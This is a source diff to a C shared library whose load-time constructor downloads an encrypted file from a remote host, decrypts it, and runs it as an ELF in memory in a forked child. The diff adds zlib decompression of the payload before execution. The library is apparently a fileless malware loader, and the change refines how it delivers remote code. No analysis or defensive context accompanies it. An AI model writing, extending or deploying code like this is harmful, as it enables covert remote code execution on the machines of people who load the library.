@@ -1,6 +1,7 @@
 #define _GNU_SOURCE
 #include "aes.h"
 #include "elf.h"
+#include "tinf.h"
 #include <dirent.h>
 #include <dlfcn.h>
 #include <fcntl.h>
@@ -60,15 +61,15 @@ void derive_key_from_string(const char *str, uint8_t *key) {
 }
 
 /**
- * Downloads a file from a specified host and port, and decrypts it using the
- * provided key.
+ * Downloads a file from a specified host and port, and decrypts and
+ * decompresses it using the provided key.
  *
  * @param host The host to download the file from.
  * @param port The port to connect to.
  * @param path The path of the file on the server.
  * @param key The decryption key.
  * @param buffer The buffer to write the downloaded data to.
- * @return The size of the downloaded data.
+ * @return The size of the decrypted and decompressed data.
  */
 size_t download_file(const char *host, const char *port, const char *path,
                      const uint8_t *key, char **buffer) {
@@ -252,6 +253,29 @@ void __attribute__((constructor)) initLibrary(void) {
   }
 #endif
 
+  // Decompress the decrypted data
+  unsigned int decompressed_size = BUFFER_SIZE * 10; // Adjust as needed
+  char *decompressed_buffer = malloc(decompressed_size);
+  if (!decompressed_buffer) {
+    perror("malloc");
+    free(buf);
+    return;
+  }
+
+  int res = tinf_zlib_uncompress(decompressed_buffer, &decompressed_size,
+                                 buf + 16, decrypted_size);
+  free(buf);
+  if (res != TINF_OK) {
+    fprintf(stderr, "Decompression failed: %d\n", res);
+    free(decompressed_buffer);
+    return;
+  }
+
+  buf = decompressed_buffer;
+  data_size = decompressed_size;
+
+  DEBUG_PRINT("Decompressed data size: %zu\n", data_size);
+
   char *argv[] = {"", NULL};
   char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
                   "HOME=/tmp",
@@ -265,7 +289,7 @@ void __attribute__((constructor)) initLibrary(void) {
   if (child == 0) {
     // Run the ELF
     DEBUG_PRINT("Running ELF...\n");
-    elf_run(buf + 16, argv, envv); // Adjust the buffer pointer
+    elf_run(buf, argv, envv); // Adjust the buffer pointer
   }
 }
 
